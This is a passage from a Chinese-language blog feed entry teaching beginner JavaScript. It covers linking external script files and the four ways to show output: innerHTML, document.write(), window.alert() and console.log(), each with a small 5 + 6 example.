class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>外部 JavaScript<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span>&gt;</span>（myFunction 存储在名为 "myScript.js" 的外部文件中。）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/demo/myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li><p>外部引用的方式</p><ul><li>可通过完整的 URL 或相对于当前网页的路径引用外部脚本：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.w3school.com.cn/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li>使用了位于当前网站上指定文件夹中的脚本：</li></ul>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><ul><li>链接了与当前页面相同文件夹的脚本：</li></ul>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="font-color-brown三-js-输出font"><a class="markdownIt-Anchor" href="#font-color-brown三-js-输出font"></a> <font color="brown">三、JS 输出</font></h3><blockquote><h4 id="font-color-navy1-js-显示方案font"><a class="markdownIt-Anchor" href="#font-color-navy1-js-显示方案font"></a> <font color="navy">1. JS 显示方案</font></h4><p>     JavaScript 能够以不同方式“显示”数据：</p><ul><li>使用<code>window.alert()</code>写入警告框</li><li>使用 <code>document.write()</code>写入 HTML 输出</li><li>使用 <code>innerHTML</code> 写入 HTML 元素</li><li>使用 <code>console.log()</code> 写入浏览器控制台</li></ul><h4 id="font-color-navy2使用-innerhtmlfont"><a class="markdownIt-Anchor" href="#font-color-navy2使用-innerhtmlfont"></a> <font color="navy">2.使用 innerHTML</font></h4><p><code>document.getElementById(id)</code></p><p>      id 属性定义 HTML 元素。innerHTML 属性定义 HTML 内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt;  <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="number">5</span> + <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>      <font color="red"><strong>提示</strong></font>：更改HTML 元素的 innerHTML 属性是在 HTML 中显示数据的常用方法。</p><h4 id="font-color-navy3使用-documentwritefont"><a class="markdownIt-Anchor" href="#font-color-navy3使用-documentwritefont"></a> <font color="navy">3.使用 document.write()</font></h4><p>      <strong>出于测试目的，使用 <code>document.write()</code> 比较方便.</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"document.write(5 + 6)"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>     <strong>注意：<strong>在HTML 文档完全加载后使用 <code>document.write()</code>将</strong>删除所有已有的</strong> <strong>HTML</strong>，<strong>document.write()</strong> 方法仅用于测试。</p><h4 id="font-color-navy4使用-windowalertfont"><a class="markdownIt-Anchor" href="#font-color-navy4使用-windowalertfont"></a> <font color="navy">4.使用 window.alert()</font></h4><p>      <strong>能够使用警告框来显示数据</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.alert(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="font-color-navy5使用-consolelogfont"><a class="markdownIt-Anchor" href="#font-color-navy5使用-consolelogfont"></a> <font color="navy">5.使用 console.log()</font></h4><p>      在浏览器中，您可使用 console.log() 方法来显示数据。可以通过 F12 来激活浏览器控制台，并在菜单中选择“控制台”。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-js-简介font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-js-简介font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、JS 简介&lt;/font
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="JavaScritpt" scheme="https://muzibing.github.io/tags/JavaScritpt/"/>
    
  </entry>
  
</feed>
